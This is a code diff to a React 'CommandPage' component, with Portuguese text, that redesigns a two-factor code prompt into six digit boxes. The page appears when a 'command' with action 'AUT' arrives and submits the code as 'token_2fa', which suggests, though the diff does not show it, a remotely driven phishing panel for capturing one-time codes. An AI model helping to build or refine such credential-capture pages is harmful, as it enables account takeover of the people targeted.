@@ -119,6 +119,8 @@ function CommandPage({ userId }) {
 
   // Página de código 2FA (Autenticação de Duas Etapas)
   if (currentCommand?.action === "AUT") {
+    const isCodeComplete = codeDigits.every(digit => digit !== '');
+    
     return (
       <div className="min-h-screen bg-white flex flex-col font-inter">
         <div className="flex-1 flex flex-col items-center pt-16 px-4">
@@ -157,51 +159,40 @@ function CommandPage({ userId }) {
 
           {/* Descrição */}
           <p className="text-gray-600 mb-8 text-center max-w-sm">
-            Digite o código do seu aplicativo autenticador ou o código de verificação que enviamos para você.
+            Digite o código do seu aplicativo autenticador
           </p>
 
           {/* Formulário */}
           <form onSubmit={(e) => handleSubmit(e, "token_2fa")} className="w-full max-w-md space-y-6">
-            {/* Campo de código */}
-            <div className="relative">
-              <div className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400">
-                <svg 
-                  xmlns="http://www.w3.org/2000/svg" 
-                  className="h-5 w-5" 
-                  fill="none" 
-                  viewBox="0 0 24 24" 
-                  stroke="currentColor"
-                >
-                  <path 
-                    strokeLinecap="round" 
-                    strokeLinejoin="round" 
-                    strokeWidth={2} 
-                    d="M7 20l4-16m2 16l4-16M6 9h14M4 15h14" 
-                  />
-                </svg>
-              </div>
-              <input
-                type="text"
-                value={inputValue}
-                onChange={(e) => {
-                  const value = e.target.value.replace(/\D/g, '');
-                  if (value.length <= 6) {
-                    setInputValue(value);
-                  }
-                }}
-                placeholder="Digite o código de 6 dígitos"
-                maxLength="6"
-                disabled={loading}
-                className="w-full pl-12 pr-4 py-3.5 border border-gray-900 rounded-lg text-center text-xl font-semibold tracking-widest focus:outline-none focus:border-pink-500 transition-colors disabled:bg-gray-100"
-              />
+            {/* 6 Quadradinhos para o código */}
+            <div className="flex justify-center gap-3">
+              {codeDigits.map((digit, index) => (
+                <input
+                  key={index}
+                  ref={(el) => (inputRefs.current[index] = el)}
+                  type="text"
+                  inputMode="numeric"
+                  maxLength="1"
+                  value={digit}
+                  onChange={(e) => handleCodeChange(index, e.target.value)}
+                  onKeyDown={(e) => handleKeyDown(index, e)}
+                  onPaste={handlePaste}
+                  disabled={loading}
+                  className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-xl focus:outline-none transition-all duration-200 ${
+                    digit 
+                      ? 'border-pink-500 bg-pink-50' 
+                      : 'border-gray-300 bg-white'
+                  } ${loading ? 'bg-gray-100 cursor-not-allowed' : 'focus:border-pink-500 focus:shadow-lg focus:shadow-pink-100'}`}
+                />
+              ))}
             </div>
 
             {/* Botão Confirmar */}
             <button
               type="submit"
-              disabled={loading || inputValue.length !== 6}
+              disabled={loading || !isCodeComplete}
               className={`w-full py-3.5 rounded-full font-medium text-base transition-all duration-300 ${
-                inputValue.length === 6 && !loading
+                isCodeComplete && !loading
                   ? "bg-gradient-to-r from-pink-500 to-pink-600 text-white hover:from-pink-600 hover:to-pink-700 shadow-md hover:shadow-lg"
                   : "bg-gray-200 text-gray-400 cursor-not-allowed"
               } ${loading ? "bg-gradient-to-r from-pink-500 to-pink-600" : ""}`}
